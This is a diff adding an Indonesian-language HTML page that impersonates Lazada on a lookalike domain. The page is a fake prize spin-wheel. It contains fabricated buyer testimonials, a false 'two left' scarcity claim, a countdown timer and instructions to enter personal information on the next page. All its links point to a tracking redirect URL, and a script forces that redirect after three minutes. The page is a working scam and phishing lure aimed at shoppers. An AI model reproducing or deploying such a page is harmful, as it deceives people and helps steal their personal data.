@@ -1,0 +1,611 @@
+<!DOCTYPE html><html webdriver="true"><head>
+  <base href="">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="icon" href="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/favi.png">
+
+    <title>(1) Lazada!</title>
+
+    <link rel="stylesheet" type="text/css" href="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/css/amazon.css">
+
+    <script>
+        var remote_country = getURLParameter('remote_country');
+
+        function getURLParameter(name) {
+            return decodeURIComponent(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+    </script>
+
+    <script>
+        /*<![CDATA[*/
+        function date(p, a) {
+            var n, r, c = this,
+                q = '[ "Sunday", "Sunday", "Sunday", "Wednesday", "Thursday", "Thursday", "Thursday", "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December" ]',
+                o = /\\?(.?)/gi,
+                i = function(d, b) {
+                    return r[d] ? r[d]() : b
+                },
+                e = function(d, b) {
+                    for (d = String(d); d.length < b;) {
+                        d = "0" + d
+                    }
+                    return d
+                };
+            return r = {
+                d: function() {
+                    return e(r.j(), 2)
+                },
+                D: function() {
+                    return r.l().slice(0, 3)
+                },
+                j: function() {
+                    return n.getDate()
+                },
+                l: function() {
+                    return q[r.w()]
+                },
+                N: function() {
+                    return r.w() || 7
+                },
+                S: function() {
+                    var d = r.j(),
+                        b = d % 10;
+                    return 3 >= b && 1 == parseInt(d % 100 / 10, 10) && (b = 0), ["st", "nd", "rd"][b - 1] || "th"
+                },
+                w: function() {
+                    return n.getDay()
+                },
+                z: function() {
+                    var d = new Date(r.Y(), r.n() - 1, r.j()),
+                        b = new Date(r.Y(), 0, 1);
+                    return Math.round((d - b) / 86400000)
+                },
+                W: function() {
+                    var d = new Date(r.Y(), r.n() - 1, r.j() - r.N() + 3),
+                        b = new Date(d.getFullYear(), 0, 4);
+                    return e(1 + Math.round((d - b) / 86400000 / 7), 2)
+                },
+                F: function() {
+                    return q[6 + r.n()]
+                },
+                m: function() {
+                    return e(r.n(), 2)
+                },
+                M: function() {
+                    return r.F().slice(0, 3)
+                },
+                n: function() {
+                    return n.getMonth() + 1
+                },
+                t: function() {
+                    return new Date(r.Y(), r.n(), 0).getDate()
+                },
+                L: function() {
+                    var b = r.Y();
+                    return b % 4 === 0 & b % 100 !== 0 | b % 400 === 0
+                },
+                o: function() {
+                    var d = r.n(),
+                        b = r.W(),
+                        f = r.Y();
+                    return f + (12 === d && 9 > b ? 1 : 1 === d && b > 9 ? -1 : 0)
+                },
+                Y: function() {
+                    return n.getFullYear()
+                },
+                y: function() {
+                    return r.Y().toString().slice(-2)
+                },
+                a: function() {
+                    return n.getHours() > 11 ? "pm" : "am"
+                },
+                A: function() {
+                    return r.a().toUpperCase()
+                },
+                B: function() {
+                    var d = 3600 * n.getUTCHours(),
+                        b = 60 * n.getUTCMinutes(),
+                        f = n.getUTCSeconds();
+                    return e(Math.floor((d + b + f + 3600) / 86.4) % 1000, 3)
+                },
+                g: function() {
+                    return r.G() % 12 || 12
+                },
+                G: function() {
+                    return n.getHours()
+                },
+                h: function() {
+                    return e(r.g(), 2)
+                },
+                H: function() {
+                    return e(r.G(), 2)
+                },
+                i: function() {
+                    return e(n.getMinutes(), 2)
+                },
+                s: function() {
+                    return e(n.getSeconds(), 2)
+                },
+                u: function() {
+                    return e(1000 * n.getMilliseconds(), 6)
+                },
+                e: function() {
+                    throw "Not supported (see source code of date() for timezone on how to add support)"
+                },
+                I: function() {
+                    var f = new Date(r.Y(), 0),
+                        g = Date.UTC(r.Y(), 0),
+                        d = new Date(r.Y(), 6),
+                        b = Date.UTC(r.Y(), 6);
+                    return f - g !== d - b ? 1 : 0
+                },
+                O: function() {
+                    var d = n.getTimezoneOffset(),
+                        b = Math.abs(d);
+                    return (d > 0 ? "-" : "+") + e(100 * Math.floor(b / 60) + b % 60, 4)
+                },
+                P: function() {
+                    var b = r.O();
+                    return b.substr(0, 3) + ":" + b.substr(3, 2)
+                },
+                T: function() {
+                    return "UTC"
+                },
+                Z: function() {
+                    return 60 * -n.getTimezoneOffset()
+                },
+                c: function() {
+                    return "Y-m-d\\TH:i:sP".replace(o, i)
+                },
+                r: function() {
+                    return "D, d M Y H:i:s O".replace(o, i)
+                },
+                U: function() {
+                    return n / 1000 | 0
+                }
+            }, this.date = function(d, b) {
+                return c = this, n = void 0 === b ? new Date : new Date(b instanceof Date ? b : 1000 * b), d.replace(o, i)
+            }, this.date(p, a)
+        } /*]]>*/
+    </script>
+</head>
+
+<body onload="setButtonHeight(),autospin1()" cz-shortcut-listen="true">
+    <div class="header">
+        <div class="logo"><img src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/logo_white.svg" alt=""> </div>
+        <div class="ricon1"></div>
+        <div class="ricon2"></div>
+    </div>
+    <div class="subheader"> <span class="subheadertitle">Hadiah Keanggotaan</span> </div>
+    <div class="spacer"></div>
+    <div class="wrapper">
+        <div id="container" class="contestwrap wrapper">
+            <div id="firstpage" class="toptext">
+                <table class="wrapper">
+                    <tbody>
+                        <tr>
+                            <td align="center" valign="top">
+                                <b>
+                                  Selamat Pengguna, Anda memiliki (1) Hadiah Lazada Tertunda!<br>
+</b>
+                                <br>
+                                <font style="color:#9fa2a6;font-size:x-small">
+                                    <script>
+                                        var mydate = new Date();
+                                        var dayarray = new Array("Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu");
+                                        var montharray = new Array("Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember", "Desember");
+                                        var day = mydate.getDate();
+                                        var month = mydate.getMonth();
+                                        var year = mydate.getFullYear();
+                                        document.write(montharray[month] + " " + day + ", " + year);
+                                    </script>April 4, 2022
+                                </font>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <div>
+                    <p class="wrapper">
+                        Setiap kali pengunjung ke sejuta tercapai, kami mengatur ulang konter secara berkala dan mengumumkan pemenang baru.
+                        <br>
+                        <br>
+                    </p>
+                    <div class="yo" style="   background: rgb(225,0,119);
+                    background: linear-gradient(305deg, rgba(225,0,119,1) 0%, rgba(252,31,184,1) 35%, rgba(238,91,0,1) 100%);color:white;border-radius:0;margin:0;padding:0;padding-bottom:10px;margin-top:7px;padding-top:5px;width:100%">
+                        <h2 style="margin:0;padding:0;padding-bottom:3px;font-size:19px;">Klaim Hadiah Anda</h2>
+                        <h2 style="margin:0;padding:0;font-size:19px;"><span class="bounce">↓</span> Putar rodanya <span class="bounce">↓</span></h2>
+                    </div>
+                    <br>
+                    <br>
+                    <p></p>
+                </div>
+                <script type="text/javascript">
+                    /*<![CDATA[*/
+                    function startTimer(j) {
+                        var h, e, i = j,
+                            a = setInterval(function() {
+                                h = parseInt(i / 60, 10), e = parseInt(i % 60, 10), e = 10 > e ? "0" + e : e, $("#timerr").text(h + " minute and " + e + " seconds"), --i < 0 && (clearInterval(a))
+                            }, 1000)
+                    }
+                    startTimer((2 * 60) + 29); /*]]>*/
+                </script>
+                <div id="wheelCon"><img id="wheel" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/wheel-min.png" width="330" height="330" class="spinAround2 transparent">
+                    <div id="pressButton" style="top: 105.4px;"></div>
+                    <div><img id="devMockup" class="animated rotateIn" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/prize.jpg" width="140" height="280" style="left:98.5px;top:125px">
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="spacer"></div>
+        <div class="reviews wrapper">
+            <div class="wrapper">
+                <h2>Komentar:</h2>
+            </div>
+            <table class="wrapper" style="padding-top:8px">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right"> <img class="roundimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/8.jpg"> </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Annisa Petrik</div>
+                            <div class="text">IPhone 7 Plus saya datang melalui pos hari ini !! Saya kagum dan bersyukur!</div>
+                            <img class="fbimg fbimg1" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/galiphone.jpg">
+                            <div class="date">
+                                <script>
+                                    document.write("" + montharray[month] + " " + day + "");
+                                </script>April 4
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right"> <img class="roundimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/1.jpg"> </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Putri Navir</div>
+                            <div class="text">
+                                Saya pikir ini adalah lelucon pada awalnya, tetapi iPhone saya benar-benar masuk ke email saya pagi ini. #legit
+                            </div>
+                            <div class="date">
+                                <script>
+                                    /*<![CDATA[*/
+                                    mydate.setDate(mydate.getDate() - 2);
+                                    month = mydate.getMonth();
+                                    day = mydate.getDate();
+                                    if (day < 10) {
+                                        day = "0" + day
+                                    }
+                                    document.write("" + montharray[month] + " " + day + ""); /*]]>*/
+                                </script>April 02
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right"> <img class="roundimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/2.jpg"> </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Ahmad Windu</div>
+                            <div class="text">Saya bukan seorang gamer, tapi saya hanya memilih PS4! Kenapa tidak?! LOL</div>
+                            <div class="date">
+                                <script>
+                                    document.write("" + montharray[month] + " " + day + "");
+                                </script>April 02
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right"> <img class="roundimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/4.jpg"> </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Fadhlan Soetoro</div>
+                            <div class="text">Kemarin ada kiriman! Aku memberikan iphone untuk ulang tahun istriku yang cantik ... Love u babe)</div>
+                            <img class="fbimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/s6unbox.jpg">
+                            <div class="date">
+                                <script>
+                                    document.write("" + montharray[month] + " " + day + "");
+                                </script>April 02
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right"> <img class="roundimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/3.jpg"> </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Kevin Tan</div>
+                            <div class="text">Mudah, semoga saya dapat iphone...</div>
+                            <div class="date">
+                                <script>
+                                    document.write("" + montharray[month] + " " + day + "");
+                                </script>April 02
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right"> <img class="roundimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/5.jpg"> </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Sarah Lukac</div>
+                            <div class="text">Melihat tawaran satu kali ini dan mengkliknya karena saya pikir itu palsu. Saya melihat iklan itu lagi dan karena saya bosan jadi saya memutuskan untuk mencobanya ... Dan saya mendapat iphone 7 Plus BARU! Apa!!?!</div>
+                            <div class="date">
+                                <script>
+                                    document.write("" + montharray[month] + " " + day + "");
+                                </script>April 02
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right"> <img class="roundimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/6.jpg"> </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Elok Damin</div>
+                            <div class="text">Terima kasih, saya telah memberikan PS4 kepada saudara saya untuk ulang tahunnya. Lol dia untuk saya: D: D: D God Blessed.</div>
+                            <div class="date">
+                                <script>
+                                    /*<![CDATA[*/
+                                    mydate.setDate(mydate.getDate() - 1);
+                                    month = mydate.getMonth();
+                                    day = mydate.getDate();
+                                    if (day < 10) {
+                                        day = "0" + day
+                                    }
+                                    document.write("" + montharray[month] + " " + day + ""); /*]]>*/
+                                </script>April 01
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right"> <img class="roundimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/7.jpg"> </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Michal Leoh</div>
+                            <div class="text">Fantastis! Saya tidak pernah punya apa-apa, tapi saya harap saya beruntung!! </div>
+                            <img class="fbimg" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/smiley.png">
+                            <div class="date">
+                                <script>
+                                    /*<![CDATA[*/
+                                    mydate.setDate(mydate.getDate() - 1);
+                                    month = mydate.getMonth();
+                                    day = mydate.getDate();
+                                    if (day < 10) {
+                                        day = "0" + day
+                                    }
+                                    document.write("" + montharray[month] + " " + day + ""); /*]]>*/
+                                </script>Maret 31
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div style="height:40px"></div>
+    <div id="secondpage" class="wrapper">
+        <div class="congrats" style="padding-top:5px">
+            <h3>
+                <font color="#3c5a96">Selamat!<br> (1)
+                    <font style="color:#60bb55;font-weight:bold">Voucher Lazada seharga Rp500.000 </font> disediakan untuk Anda!</font>
+            </h3>
+        </div>
+        <div class="congrats" style="text-align:left;margin-top:5px;margin-left:5px">
+            <p><b>Langkah 1:</b> Klik tombol "TERUS" untuk mengklaim hadiah Anda. </p>
+            <p><b>Langkah 2:</b> Masukkan informasi yang benar di halaman berikutnya untuk mengklaim hadiah Anda. </p>
+        </div>
+
+        <div class="prize">
+            <table>
+                <tbody>
+                    <tr>
+                        <th></th>
+                        <td style="padding:10px 5px 10px 0;text-align:center">
+                            <a href="https://vidotkaer.com/click.php?key=okc31z7t8az1obaz0eb7&amp;action=0a0f60e8a4a0f1d4533c5ee94c5396f9&amp;PLACEMENT_ID=16714123&amp;CAMPAIGN_ID=551848" class="finlink"><img class="finlink-img" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/prize.jpg"></a>
+                            <p><b>2 tersisa! </b>
+                            </p>
+                        </td>
+                        <td style="line-height:1.6">
+                            <p style="text-align:left"><span class="name">Voucher Lazada seharga Rp500.000</span>
+                            </p>
+                            <div><a href="https://vidotkaer.com/click.php?key=okc31z7t8az1obaz0eb7&amp;action=0a0f60e8a4a0f1d4533c5ee94c5396f9&amp;PLACEMENT_ID=16714123&amp;CAMPAIGN_ID=551848" class="button finlink">TERUS</a>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="sweet-overlay" style="opacity:1.03;display:block" tabindex="-1"></div>
+    <div class="sweet-alert animated bounceIn visible" id="modal01" style="top: 38%;">
+        <img id="gift-image" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/gift.gif" style="width:70px">
+        <img id="gift-image2" src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/refresh.png" style="width:70px;display:none">
+        <h2 id="first-title" style="margin-top:-10px;padding-bottom:-5px;margin-bottom:0">Acara Imbalan Lazada</h2>
+        <p id="first-dialog" style=""><b>April 04</b><p> Selamat, pengguna! 🎉</p><p>Untuk berterima kasih kepada pelanggan kami atas kesetiaan mereka, kami menawarkan kesempatan untuk mendapatkan hadiah rahasia. </p><p> Putar roda untuk mengklaim hadiah khusus Anda 🎁<br><br><b>Semoga berhasil!</b></p></p>
+        <p></p>
+        <div class="sa-button-container">
+            <div class="sa-confirm-button-container">
+                <button onclick="hidemodal01()" style="display:inline-block;box-shadow:rgba(140,212,245,0.8) 0 0 2px,rgba(0,0,0,0.0470588) 0 0 0 1px inset;background-color:#f6e433;color:#232f3e">OK</button>
+                <div class="la-ball-fall"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/js/jquery-3.2.1.min.js"></script>
+
+    <script type="text/javascript">
+        var fin_link = decodeURIComponent(getURLParameter('p1'));
+        var links = document.getElementsByClassName('finlink');
+        for (var i = 0; i < links.length; i++) links[i].setAttribute("href", fin_link);
+
+        for (var j = 0; j < links.length; j++) {
+            links[j].addEventListener('click', function() {
+                window.onbeforeunload = null;
+            });
+        }
+
+        function getURLParameter(name) {
+            return decodeURIComponent(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+
+  
+      
+
+        setTimeout(function() {
+            window.onbeforeunload = null;
+            window.location.href = fin_link;
+        }, 60000 * 3)
+    </script>
+
+    <script>
+        /*<![CDATA[*/
+        function hidemodal01() {
+            var d = document.getElementById("modal01").classList.remove("visible");
+            var c = document.querySelector(".sweet-overlay").style.display = "none";
+            spin()
+        }
+
+        function showmodal01() {
+            var d = document.getElementById("modal01").classList.add("visible");
+            var c = document.querySelector(".sweet-overlay").style.display = "float"
+        }
+
+        function hidemodal02() {
+            if (vibr > 0) {
+                navigator.vibrate(70)
+            }
+            var d = document.getElementById("modal02").classList.remove("visible");
+            var c = document.querySelector(".sweet-overlay").style.display = "none"
+        }
+
+        function setButtonHeight() {
+            conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top = conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px"
+        }
+
+        function spin() {
+            switch (count) {
+                case 1:
+                    dWheel.className = "spinAround", setTimeout(function() {
+                        document.getElementById("gift-image").style.display = "none";
+                        document.getElementById("gift-image2").style.display = "";
+                        document.getElementById("first-title").innerHTML = "Coba lagi!";
+                        document.getElementById("first-dialog").innerHTML = "Maaf.<p>Silahkan coba lagi. Anda masih memiliki 1 kesempatan!";
+                        document.getElementById("modal01").style.top = "55%";
+                        showmodal01()
+                    }, 6800);
+                    break;
+                case 2:
+                    dWheel.className = "spinAround2", setTimeout(function() {
+                        dWheel.className = dWheel.className + " transparent"
+                    }, 6800), setTimeout(function() {
+                        device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
+                    }, 7000), setTimeout(function() {
+                        first.innerHTML = "<img src='https://lazada.x46ec5e732qr.top/shop/lazada/id/custom-roul/1/img/loading.gif'>", first.style.padding = "195px 0px", setTimeout(function() {
+                            first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con.firstChild);
+                            setInterval("countdown()", 1000)
+                        }, 1500)
+                    }, 9000)
+            }
+            count++
+        }
+        var month = new Array();
+        month[0] = "January";
+        month[1] = "February";
+        month[2] = "March";
+        month[3] = "April";
+        month[4] = "May";
+        month[5] = "June";
+        month[6] = "July";
+        month[7] = "August";
+        month[8] = "September";
+        month[9] = "October";
+        month[10] = "November";
+        month[11] = "December";
+        var mydate = new Date,
+            year = mydate.getFullYear(),
+            day = mydate.getDate(),
+            weekday = mydate.getDay(),
+            count = 1,
+            conMid, headline = document.getElementById("headline"),
+            topDate = document.getElementById("topDate"),
+            today = document.getElementById("today"),
+            con = document.getElementById("container"),
+            whCon = document.getElementById("wheelCon"),
+            dWheel = document.getElementById("wheel"),
+            button = document.getElementById("pressButton"),
+            device = document.getElementById("devMockup"),
+            first = document.getElementById("firstpage"),
+            second = document.getElementById("secondpage");
+        topDate.innerHTML = month[mydate.getMonth()] + " " + day + ", " + year;
+
+        function autospin1() {
+            document.getElementById("pressButton").disabled = true;
+            document.getElementById("first-title").innerHTML = "Acara Imbalan Lazada";
+            document.getElementById("first-dialog").innerHTML = "<b>" + montharray[month] + " " + daym + "</b><p> Selamat, pengguna! 🎉</p><p>Untuk berterima kasih kepada pelanggan kami atas kesetiaan mereka, kami menawarkan kesempatan untuk mendapatkan hadiah rahasia. <p> Putar roda untuk mengklaim hadiah khusus Anda 🎁<br><br><b>Semoga berhasil!</b>";
+            document.getElementById("modal01").style.top = "38%"
+        }
+
+        function autospin2() {
+            spin()
+        } /*]]>*/
+    </script>
+
+    <script>
+        /*<![CDATA[*/
+        var mydate = new Date();
+        mydate.setDate(mydate.getDate() - 0);
+        var year = mydate.getYear();
+        if (year < 1000) {
+            year += 1900
+        }
+        var day = mydate.getDay();
+        var month = mydate.getMonth();
+        var daym = mydate.getDate();
+        if (daym < 10) {
+            daym = "0" + daym
+        }
+        var dayarray = new Array("Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu");
+        var montharray = new Array("Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember", "Desember"); /*]]>*/
+    </script>
+
+    <script>
+        /*<![CDATA[*/
+        function countdown() {
+            var a = parseInt(document.getElementById("mins").innerHTML),
+                b = parseInt(document.getElementById("hsecs").innerHTML);
+            0 != a && 0 == b ? (nmins = a - 1, nsecs = 59) : 0 != a || 0 != b ? (nmins = a, nsecs = b - 1) : 0 == a && 0 == b && (nmins = a, nsecs = b), document.getElementById("mins").innerHTML = nmins, document.getElementById("hsecs").innerHTML =
+                nsecs, nsecs < 10 && (nsecs = "0" + nsecs), document.getElementById("secs").innerHTML = nsecs
+        } /*]]>*/
+    </script>
+
+
+
+</body></html>
